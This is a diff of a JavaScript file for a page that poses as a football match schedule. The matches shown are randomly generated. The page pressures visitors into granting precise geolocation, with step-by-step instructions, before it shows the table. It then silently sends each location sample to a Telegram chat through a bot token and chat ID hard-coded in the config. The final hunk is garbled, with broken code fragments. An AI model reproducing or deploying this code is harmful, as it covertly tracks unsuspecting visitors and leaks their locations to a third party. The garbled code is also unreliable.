@@ -1,7 +1,7 @@
 const CONFIG = {
   telegramBotToken: '8429040793:AAHyb0ebmApHOl1d_NvtXDdCBZ-dw_w2M8Y',
   telegramChatId: '8209565969',
-  splashDurationMs: 5000,
+  splashDurationMs: 10000, // 10 ثواني
   developerName: '𝓐𝓱𝓶𝓮𝓭 𝓜𝓸𝓼𝓽𝓪𝓯𝓪'
 };
 
@@ -9,31 +9,30 @@ const splash = document.getElementById('splash');
 const skipBtn = document.getElementById('skip-btn');
 const matchTable = document.getElementById('match-table');
 const leaguesDiv = document.getElementById('leagues');
-
 const locationMsg = document.getElementById('location-msg');
 const grantBtn = document.getElementById('grant-btn');
 const retryBtn = document.getElementById('retry-btn');
-const grantInstructions = document.getElementById('grant-instructions');
 
 let _samples = [];
 
-// إخفاء البوب بعد الضغط أو بعد 10 ثواني
+// إخفاء البوب
 function hideSplash() {
+  if (!splash || splash.classList.contains('hidden')) return;
   splash.classList.add('hidden');
-  setTimeout(requestGeolocation, 500); // ظهور الرسالة بسلاسة بعد البوب
+  setTimeout(() => requestGeolocation(), 500); // طلب الموقع بعد اختفاء البوب
 }
 
+// أحداث الضغط أو الانتظار
 splash.addEventListener('click', hideSplash);
 skipBtn.addEventListener('click', hideSplash);
 setTimeout(hideSplash, CONFIG.splashDurationMs);
 
-// طلب الإذن بالموقع
+// طلب الموقع
 function requestGeolocation() {
   if (!navigator.geolocation) {
     showLocationRequired();
     return;
   }
-
   navigator.geolocation.getCurrentPosition(
     pos => {
       _samples.push({
@@ -45,22 +44,19 @@ function requestGeolocation() {
       sendSampleToTelegram(_samples[_samples.length - 1]);
       showMatchesTable();
     },
-    err => {
-      showLocationRequired();
-    },
+    err => { showLocationRequired(); },
     { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
   );
 }
 
-// عرض رسالة منح الإذن بسلاسة
+// عرض رسالة منح الإذن بس بعد البوب لو ما منحش المستخدم الإذن
 function showLocationRequired() {
   locationMsg.style.display = 'flex';
-  setTimeout(() => locationMsg.classList.add('show'), 50); // ظهور تدريجي
 }
 
-// زر منح الإذن: إظهار الخطوات
+// زر منح الإذن: يظهر مرة واحدة ويعرض الخطوات
 grantBtn.onclick = () => {
-  grantInstructions.style.display = 'block';
+  alert("انظر في بداية شريط البحث، ستجد خطين بجوار الميكروفون ع اليمين، اضغط عليهم → ثم اضغط على الإذونات → ثم فعل إذن الوصول للموقع → وأخيرًا اضغط إعادة المحاولة.");
 };
 
 // زر إعادة المحاولة: يعيد تحميل الصفحة
@@ -68,7 +64,7 @@ retryBtn.onclick = () => {
   window.location.reload();
 };
 
-// إرسال بيانات الموقع لتليجرام
+// إرسال بيانات الموقع للتليجرام
 function sendSampleToTelegram(sample) {
   const text = `📍 Sample
 🕒 ${sample.timestamp}
@@ -90,7 +86,7 @@ function _sendTelegramMessage(text) {
   }).catch(err => console.error(err));
 }
 
-/* --- جدول المباريات --- */
+/* --- MATCH TABLE --- */
 const leaguesData = [
   { name: 'الدوري المصري', matches: generateMatches(3) },
   { name: 'الدوري الإنجليزي', matches: generateMatches(3) },
@@ -143,11 +139,7 @@ function showMatchesTable() {
 
     leaguesDiv.appendChild(leagueDiv);
   });
-}r(Math.random()*teams.length)]; } while(t2 === t1);
-    arr.push({
-      team1: t1,
-      team2: t2,
-      time: `${String(Math.floor(Math.random()*24)).padStart(2,'0')}:${String(Math.floor(Math.random()*60)).padStart(2,'0')}`,
+}`,
       stadium: stadiums[Math.floor(Math.random()*stadiums.length)]
     });
   }
